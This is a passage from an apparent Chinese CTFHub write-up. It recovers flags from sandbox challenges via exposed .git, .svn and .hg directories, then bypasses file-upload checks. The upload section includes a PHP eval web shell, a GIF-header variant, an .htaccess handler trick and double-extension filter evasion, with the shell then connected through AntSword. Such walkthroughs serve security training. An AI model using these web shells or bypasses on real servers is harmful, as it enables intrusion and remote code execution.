Clone Error<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone with Directory Listing<span class="token punctuation">[</span>*<span class="token punctuation">]</span> http://challenge-bcc954ebd1926525.sandbox.ctfhub.com:10080/.git/ is not support Directory Listing<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token punctuation">[</span>Skip<span class="token punctuation">]</span><span class="token punctuation">[</span>First Try<span class="token punctuation">]</span> Target is not support Directory Listing<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to clone with Cache<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Git<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cache files<span class="token punctuation">[</span>*<span class="token punctuation">]</span> packed-refs<span class="token punctuation">[</span>*<span class="token punctuation">]</span> config<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> COMMIT_EDITMSG<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ORIG_HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> FETCH_HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/heads/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/remote/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> index<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/heads/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/67/6ee2ab05e4e9190d1eb94e035ad00b23e6db3d<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/a3/b071375bbc6d7315c553d28efc9ddd16c79cbe<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/8a/3f858443df92e83814ad7d6340c786c1dbafaf<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/2c/59e3024e3bc350976778204928a21d9ff42d01<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/0d/3c5e077dbbc36f7fc5fe0812c5d07173595749<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/e3/58b09f4cb4e5800dd20e1aa6758bf80811001a<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects End<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/remote/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/stash<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/stash<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/06/36184b6082890f325e44990c6805a70f1dd06b<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/2d/78a2c68cc4d62aac1d07f4321a7d0385e026a6<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/e0/8222e5d2f251eb14754ed3b40d9a1ef2f639ed<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/6c/dfa192a6458d5c5611fe5eb44338b77d712bf2<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects End<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Valid Repository<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid Repository Success<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Clone Success. Dist File <span class="token keyword">:</span> /mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后</p><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master <span class="token function">cd</span> dist/challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080➜  challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">git</span> stash liststash@<span class="token punctuation">{</span>0<span class="token punctuation">}</span>: WIP on master: a3b0713 add flag<span class="token comment" spellcheck="true">#可以看到栈中有内容，直接弹出</span>➜  challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">git</span> stash popCONFLICT <span class="token punctuation">(</span>modify/delete<span class="token punctuation">)</span>: 2677036325324.txt deleted <span class="token keyword">in</span> Updated upstream and modified <span class="token keyword">in</span> Stashed changes. Version Stashed changes of 2677036325324.txt left <span class="token keyword">in</span> tree.The stash entry is kept <span class="token keyword">in</span> <span class="token keyword">case</span> you need it again.➜  challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">cat</span> 2677036325324.txtctfhub<span class="token punctuation">{</span>69ad3cdc7bae528787ead797f0ce24c24a2613fc<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-3、index"><a href="#4-3、index" class="headerlink" title="4.3、index"></a>4.3、index</h4><p>​        当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master python GitHack.py http://challenge-858daa56ad3a890b.sandbox.ctfhub.com:10080/.git  ____ _ _   _   _            _ / ___<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>  _<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>  _  <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span> \____<span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__,_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>\_\<span class="token punctuation">{</span>0.0.5<span class="token punctuation">}</span> A <span class="token string">'.git'</span> folder disclosure exploit.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Check Depends<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Check depends end<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Set Paths<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target Url: http://challenge-858daa56ad3a890b.sandbox.ctfhub.com:10080/.git/<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Target<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone straightly<span class="token punctuation">[</span>*<span class="token punctuation">]</span> CloneCloning into <span class="token string">'/mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080'</span><span class="token punctuation">..</span>.fatal: repository <span class="token string">'http://challenge-858daa56ad3a890b.sandbox.ctfhub.com:10080/.git/'</span> not found<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Clone Error<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone with Directory Listing<span class="token punctuation">[</span>*<span class="token punctuation">]</span> http://challenge-858daa56ad3a890b.sandbox.ctfhub.com:10080/.git/ is not support Directory Listing<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token punctuation">[</span>Skip<span class="token punctuation">]</span><span class="token punctuation">[</span>First Try<span class="token punctuation">]</span> Target is not support Directory Listing<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to clone with Cache<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Git<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cache files<span class="token punctuation">[</span>*<span class="token punctuation">]</span> packed-refs<span class="token punctuation">[</span>*<span class="token punctuation">]</span> config<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> COMMIT_EDITMSG<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ORIG_HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> FETCH_HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/heads/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/remote/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> index<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/heads/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/28/24e1bbf84973508284fdb7e401b068d36ee5e9<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/f4/a95a1573c72e0ac3be354b13e7f7707d730384<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/be/0651e066fd7424d5469d34872219d0750469f9<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/26/3f2708ef410c0e91c4bd6985ecaedd2a4a04c7<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/2c/59e3024e3bc350976778204928a21d9ff42d01<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects End<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/remote/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/stash<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/stash<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Valid Repository<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid Repository Success<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Clone Success. Dist File <span class="token keyword">:</span> /mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看一下就得到flag了</p><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master <span class="token function">cd</span> /mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080➜  challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ lltotal 0-rwxrwxrwx 1 kali kali  49 Mar 15 20:50 213531131228420.txt-rwxrwxrwx 1 kali kali 494 Mar 15 20:50 50x.html-rwxrwxrwx 1 kali kali 143 Mar 15 20:50 index.html➜  challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">cat</span> 213531131228420.txtctfhub<span class="token punctuation">{</span>8e1d7681a1a66c8b74d5a1b20b3a6b0d920589e2<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5、SVN"><a href="#5、SVN" class="headerlink" title="5、SVN"></a>5、SVN</h3><p>​        当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p><pre class="line-numbers language-bash"><code class="language-bash">➜  dvcs-ripper-master <span class="token function">sudo</span> perl rip-svn.pl -u http://challenge-c523a500b40f2829.sandbox.ctfhub.com:10080/.svn/<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Found new SVN client storage format<span class="token operator">!</span>REP INFO <span class="token operator">=</span><span class="token operator">></span> 1:file:///opt/svn/ctfhub:e43e7ef8-82fb-4194-9673-81c29de69c33<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Trying to revert the tree, <span class="token keyword">if</span> you get error, upgrade your SVN client<span class="token operator">!</span>Reverted <span class="token string">'index.html'</span>➜  dvcs-ripper-master ll -atotal 80Kdrwxrwxrwx 1 kali kali 4.0K Mar 15 21:24 <span class="token keyword">.</span>drwxrwxrwx 1 kali kali 4.0K Mar 15 21:21 <span class="token punctuation">..</span>-rwxrwxrwx 1 kali kali  149 Oct 22  2018 .gitignore-rwxrwxrwx 1 kali kali 3.8K Oct 22  2018 hg-decode.pl-rwxrwxrwx 1 kali kali  221 Mar 15 21:24 index.html-rwxrwxrwx 1 kali kali  18K Oct 22  2018 LICENSE-rwxrwxrwx 1 kali kali 5.5K Oct 22  2018 README.md-rwxrwxrwx 1 kali kali 6.3K Oct 22  2018 rip-bzr.pl-rwxrwxrwx 1 kali kali 4.7K Oct 22  2018 rip-cvs.pl-rwxrwxrwx 1 kali kali  15K Oct 22  2018 rip-git.pl-rwxrwxrwx 1 kali kali 6.0K Oct 22  2018 rip-hg.pl-rwxrwxrwx 1 kali kali 6.1K Oct 22  2018 rip-svn.pldrwxrwxrwx 1 kali kali 4.0K Mar 15 21:24 .svn<span class="token comment" spellcheck="true">#发现生成了.svn这个目录，可以继续查看</span>➜  dvcs-ripper-master tree .svn.svn├── entries├── <span class="token function">format</span>├── pristine│   ├── bf│   │   └── bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base│   └── c4│       └── c4b3e18fe09fc3a63ec12c483c84012537bb5f2c.svn-base├── text-base├── tmp├── wc.db└── wc.db-journal➜  pristine <span class="token function">cat</span> c4/c4b3e18fe09fc3a63ec12c483c84012537bb5f2c.svn-base bf/bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-basectfhub<span class="token punctuation">{</span>1be4627619f2fd32babf97c15c0c93b1ce342934<span class="token punctuation">}</span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span> /<span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span>CTFHub 信息泄露 SVN<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    <span class="token operator">&lt;</span>h1<span class="token operator">></span>信息泄露 - Subversion<span class="token operator">&lt;</span>/h1<span class="token operator">></span>    <span class="token operator">&lt;</span>br/<span class="token operator">></span>    <span class="token operator">&lt;</span>p<span class="token operator">></span>Flag 在服务端旧版本的源代码中<span class="token operator">&lt;</span>/p<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span>%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到了flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>1be4627619f2fd32babf97c15c0c93b1ce342934<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6、HG泄露"><a href="#6、HG泄露" class="headerlink" title="6、HG泄露"></a>6、HG泄露</h3><p>​        当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p><pre class="line-numbers language-bash"><code class="language-bash">  dvcs-ripper-master <span class="token function">sudo</span> perl rip-hg.pl -u http://challenge-cf7c8f19e3e86d74.sandbox.ctfhub.com:10080/.hg/<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Getting correct 404 responses<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Finished <span class="token punctuation">(</span>2 of 12<span class="token punctuation">)</span>➜  dvcs-ripper-master <span class="token function">cd</span> .hg➜  .hg tree<span class="token keyword">.</span>├── 00changelog.i├── dirstate├── last-message.txt├── requires├── store│   ├── 00changelog.i│   ├── 00manifest.i│   ├── data│   │   ├── 50x.html.i│   │   └── index.html.i│   ├── fncache│   └── undo├── undo.branch├── undo.desc├── undo.dirstate└── wcache    ├── checklink -<span class="token operator">></span> checklink-target    └── checklink-target3 directories, 15 files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">➜  .hg <span class="token function">cat</span> store/*or��������� <span class="token punctuation">(</span>               ���$<span class="token operator">!</span>�<span class="token operator">|</span>���M�x�-�Akx�ɻtv����e�����<span class="token operator">!</span>β�^:<span class="token string">"(��_I,�B֋R�F�-kD�H;���;��J�9��T�����uH{'�!�hM�TRY�5���>��1@�>_�/X�LDDa��^�A�PS��|���=�ȠXrI   �9)5����x!(�!��}��|���۰����Iz}�&lt;I������u�����nw�>���n                                                                                                   ������"</span> Yf��������H�tw�����m'�Ȉ�*x�-�1�@�<span class="token operator">></span>�@<span class="token punctuation">)</span>-<span class="token operator">&lt;</span>�M������x�1<span class="token operator">&lt;</span>�v�Ǣ�2K<span class="token punctuation">)</span><span class="token punctuation">{</span>�Z3�s�<span class="token operator">&amp;</span>ӱfA����?6<span class="token punctuation">[</span>�B�                                                                               6�Ta�<span class="token punctuation">(</span>��1$�Ü*YI�����<span class="token punctuation">;</span><span class="token punctuation">]</span>xf$�<span class="token operator">|</span>��z����uX�T22<span class="token operator">=</span>flag_1027926131.txt52ec47b45f42236237d78a46be594c753f4754c7cat: store/data: Is a directorydata/index.html.idata/50x.html.idata/flag_1027926131.txt.idata/flag_1027926131.txt.i000manifest.i15300changelog.i175<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用命令</p><pre class="line-numbers language-bash"><code class="language-bash">➜  .hg curl http://challenge-cf7c8f19e3e86d74.sandbox.ctfhub.com:10080/flag_1027926131.txtctfhub<span class="token punctuation">{</span>7858c2fb14bc35af6870bfecaa93fce0a4e7269b<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="二、文件上传"><a href="#二、文件上传" class="headerlink" title="二、文件上传"></a>二、文件上传</h2><h3 id="1、无验证"><a href="#1、无验证" class="headerlink" title="1、无验证"></a>1、无验证</h3><img src="https://s1.ax1x.com/2020/04/08/GfaZsH.png"><p>先编写一句话木马</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'vale'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因为这个题目时没有验证，所以可以直接上传</p><img src="https://s1.ax1x.com/2020/04/08/GfaFJK.png"><p>然后得到了路径，这里使用蚁剑连接</p><img src="https://s1.ax1x.com/2020/04/08/GfaAzD.png"><p>点击添加之后就能看到可以连接了</p><img src="https://s1.ax1x.com/2020/04/08/Gfaii6.png"><p>然后向上级目录查找</p><img src="https://s1.ax1x.com/2020/04/08/GfaCIx.png"><p>得到flag文件，打开即可获取flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>85c40de2fe2b5475d81dd2a491600ae533a3602c<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、前端验证"><a href="#2、前端验证" class="headerlink" title="2、前端验证"></a>2、前端验证</h3><p>​    这里题目提示是有前端验证的</p><img src="https://s1.ax1x.com/2020/04/08/GfaeLd.png"><p>然后我们先提交一个1.php，看看响应是什么</p><img src="https://s1.ax1x.com/2020/04/08/GfaneA.png"><p>这里直接得到了一个允许上传的提示，查看一下源代码</p><pre class="line-numbers language-javascript"><code class="language-javascript"> <span class="token keyword">var</span> whitelist<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token string">".jpg"</span><span class="token punctuation">,</span><span class="token string">".png"</span><span class="token punctuation">,</span><span class="token string">".gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里看到只允许上传三种图片，尝试通过修改文件名后缀来进行绕过</p><img src="https://s1.ax1x.com/2020/04/08/GfaKot.png"><p>这里上传了一个<code>1.php.jpg</code>发现可以上传成功，使用Burpsuite来对上传的这个文件进行修改</p><img src="https://s1.ax1x.com/2020/04/08/Gfa1W8.png"><p>这里显示上传成功了，这里用蚁剑连接，得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>e3f815403d9372e9ed80556faf1205b39af449be<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3、-htaccess"><a href="#3、-htaccess" class="headerlink" title="3、.htaccess"></a>3、<code>.htaccess</code></h3><p>​        <code>htaccess</code> 文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><img src="https://s1.ax1x.com/2020/04/08/Gfa8SS.png"><p>先来写一个<code>.htaccess</code></p><pre><code>&lt;FilesMatch '1'&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>然后上传上去</p><img src="https://s1.ax1x.com/2020/04/08/GfaGQg.png"><p>再将一句话木马上传上去</p><img src="https://s1.ax1x.com/2020/04/08/GfaNes.png"><p>然后查看</p><img src="https://s1.ax1x.com/2020/04/08/Gfaaoq.png"><p>后缀为 <code>.jpg</code> 的文件已经被当作 <code>php</code> 执行了，在上级目录找到flag</p><h3 id="4、文件头检查"><a href="#4、文件头检查" class="headerlink" title="4、文件头检查"></a>4、文件头检查</h3><p>先修改一下一句话木马</p><pre class="line-numbers language-php"><code class="language-php">GIF89a<span class="token delimiter">&lt;?php</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'vale'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="https://s1.ax1x.com/2020/04/08/Gfa0YV.png"><p>发现可以上传成功，然后通过Burpsuite修改截取到的报文，改为php</p><img src="https://s1.ax1x.com/2020/04/08/GfaBWT.png"><p>上蚁剑</p><p>可以获取到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>7e23bd109e2388c287799eb8abe02c84849ddee2<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5、MIME绕过"><a href="#5、MIME绕过" class="headerlink" title="5、MIME绕过"></a>5、MIME绕过</h3><p>​        通常题目都有多种解法，这里给出两种解法</p><h4 id="5-1、修改文件名后缀"><a href="#5-1、修改文件名后缀" class="headerlink" title="5.1、修改文件名后缀"></a>5.1、修改文件名后缀</h4><img src="https://s1.ax1x.com/2020/04/08/GfaslF.png"><p>然后用蚁剑就可以连接上1.php</p><img src="https://s1.ax1x.com/2020/04/08/Gfayy4.png"><p>于是获取到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>7a1ea639715f683cf8d28d321d47d6045ff3fb98<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-2、修改MIME属性"><a href="#5-2、修改MIME属性" class="headerlink" title="5.2、修改MIME属性"></a>5.2、修改MIME属性</h4><img src="https://s1.ax1x.com/2020/04/08/Gfa6OJ.png"><p>同样能获取flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>7a1ea639715f683cf8d28d321d47d6045ff3fb98<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6、00截断"><a href="#6、00截断" class="headerlink" title="6、00截断"></a>6、00截断</h3><p>​        了解一下 PHP 5.2 00截断上传的原理</p><img src="https://s1.ax1x.com/2020/04/08/Gfagm9.png"><p>然后得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>07deef9128fa647f12cd720c83ebc39b666de009<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7、双写后缀"><a href="#7、双写后缀" class="headerlink" title="7、双写后缀"></a>7、双写后缀</h3><p>​        题目中的黑名单源码</p><pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--$name = basename($_FILES['file']['name']);$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");$name = str_ireplace($blacklist, "", $name);--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上传了一个2.phpp后得到响应</p><pre class="line-numbers language-bash"><code class="language-bash">上传文件相对路径upload/2.p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以构建2.phppphphphpp，上传文件成功</p><img src="https://s1.ax1x.com/2020/04/08/Gfa2wR.png"><p>使用蚁剑连接得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>c85d034eaceabfe7adc8bacd788171ababc9d981<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="三、RCE"><a href="#三、RCE" class="headerlink" title="三、RCE"></a>三、RCE</h2><h3 id="1、命令注入"><a href="#1、命令注入" class="headerlink" title="1、命令注入"></a>1、命令注入</h3><h4 id="1-1、无过滤"><a href="#1-1、无过滤" class="headerlink" title="1.1、无过滤"></a>1.1、无过滤</h4><p>​        这是一个在线测试网络延迟的平台，路由器中经常会见到。无任何安全措施，尝试获取 flag</p><img src="https://s1.ax1x.com/2020/04/08/GfafFx.png"><p>然后查看当前目录下的另外一个文件</p><img src="https://s1.ax1x.com/2020/04/08/GfahY6.png"><p>执行成功了，但是没显示，查看源码</p><img src="https://s1.ax1x.com/2020/04/08/Gfa4fK.png"><p>得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>6d3ee68b38435ebaf9a6b2c8727df1ad4ecb0efb<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-2、过滤cat"><a href="#1-2、过滤cat" class="headerlink" title="1.2、过滤cat"></a>1.2、过滤cat</h4><p>只是过滤了cat命令，可以使用的还有很多，比如less、more等</p><img src="https://s1.ax1x.com/2020/04/08/GfaISO.png"><p>得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>c9b549c888333093c59b5bb891f23b71eaf9c0f5<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-3、这次过滤了空格，你能绕过吗"><a href="#1-3、这次过滤了空格，你能绕过吗" class="headerlink" title="1.3、这次过滤了空格，你能绕过吗"></a>1.3、这次过滤了空格，你能绕过吗</h4><p>还是先查看</p><img src="https://s1.ax1x.com/2020/04/08/GfaolD.png"><p>得到了提示</p><pre class="line-numbers language-bash"><code class="language-bash">flag_94782730921038.php<span 